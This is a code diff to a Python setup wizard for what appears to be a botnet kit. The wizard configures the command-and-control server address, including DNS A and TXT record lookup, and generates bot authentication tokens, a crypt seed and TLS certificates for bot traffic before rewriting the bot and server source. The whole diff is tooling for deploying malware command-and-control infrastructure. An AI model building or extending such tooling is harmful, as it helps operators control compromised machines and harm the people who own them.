@@ -725,7 +725,10 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     print_step(1, 5, "C2 Server Configuration")
 
     print(
-        f"{Colors.DIM}   Enter IP address or domain. Bots will connect on port 443.{Colors.RESET}\n"
+        f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}\n"
     )
 
     c2_ip = prompt("What is your C2 server IP or domain?", "127.0.0.1")
@@ -741,21 +744,13 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     # Step 2: Security Tokens
     print_step(2, 5, "Security Token Generation")
 
-    auto_magic = generate_magic_code(16)
-    auto_protocol = generate_protocol_version()
+    magic_code = generate_magic_code(16)
+    protocol_version = generate_protocol_version()
     crypt_seed = generate_crypt_seed()
 
-    print(
-        f"{Colors.DIM}   Tokens authenticate bots to your C2. Auto-generated is recommended.{Colors.RESET}\n"
-    )
-
-    if confirm("Would you like to use auto-generated security tokens?"):
-        magic_code = auto_magic
-        protocol_version = auto_protocol
-        success(f"Magic: {magic_code} | Protocol: {protocol_version}")
-    else:
-        magic_code = prompt("Enter custom magic code", auto_magic)
-        protocol_version = prompt("Enter custom protocol version", auto_protocol)
+    success(f"Magic: {magic_code}")
+    success(f"Protocol: {protocol_version}")
+    success(f"Crypt seed: {crypt_seed}")
 
     config["magic_code"] = magic_code
     config["protocol_version"] = protocol_version
@@ -773,13 +768,26 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         sys.exit(1)
 
     # Step 3: Certificates
-    print_step(3, 5, "TLS Certificate Generation")
+    print_step(3, 5, "TLS Certificates")
 
     print(
-        f"{Colors.DIM}   TLS certificates encrypt bot communications. Press Enter for defaults.{Colors.RESET}\n"
+        f"{Colors.DIM}   TLS certs are required. You can self-sign here or use Let's Encrypt/your own.{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Place your own certs at: cnc/server.crt and cnc/server.key{Colors.RESET}\n"
     )
 
-    if confirm("Would you like to customize certificate details?", default=False):
+    print(f"  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} Generate self-signed certificates")
+    print(
+        f"  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} I'll provide my own (Let's Encrypt, etc.)\n"
+    )
+
+    cert_choice = prompt("Select option", "1")
+
+    if cert_choice == "1":
+        print(
+            f"\n{Colors.DIM}   Enter certificate details (press Enter for defaults):{Colors.RESET}\n"
+        )
         cert_config = {
             "country": prompt("Country code (2 letter)", "US"),
             "state": prompt("State/Province", "California"),
@@ -788,23 +796,17 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
             "cn": prompt("Common Name (domain)", c2_ip),
             "days": int(prompt("Valid days", "365")),
         }
-    else:
-        cert_config = {
-            "country": "US",
-            "state": "California",
-            "city": "San Francisco",
-            "org": "Security Research",
-            "cn": c2_ip,
-            "days": 365,
-        }
-    config["cert"] = cert_config
+        config["cert"] = cert_config
 
-    if not generate_certificates(cnc_path, cert_config):
-        error("Certificate generation failed!")
-        if not confirm("Would you like to continue without new certificates?"):
-            sys.exit(1)
+        if not generate_certificates(cnc_path, cert_config):
+            error("Certificate generation failed!")
+            if not confirm("Would you like to continue anyway?"):
+                sys.exit(1)
+        else:
+            success("Self-signed TLS certificates generated")
     else:
-        success("TLS certificates generated")
+        config["cert"] = {"custom": True}
+        warning("Remember to place server.crt and server.key in cnc/ folder")
 
     # Step 4: Update Source
     print_step(4, 5, "Updating Source Code")
@@ -900,7 +902,10 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     print_step(1, 2, "New C2 Address")
 
     print(
-        f"{Colors.DIM}   Enter your new IP address or domain. Bots connect on port 443.{Colors.RESET}\n"
+        f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}\n"
     )
 
     c2_ip = prompt("What is your new C2 server IP or domain?")
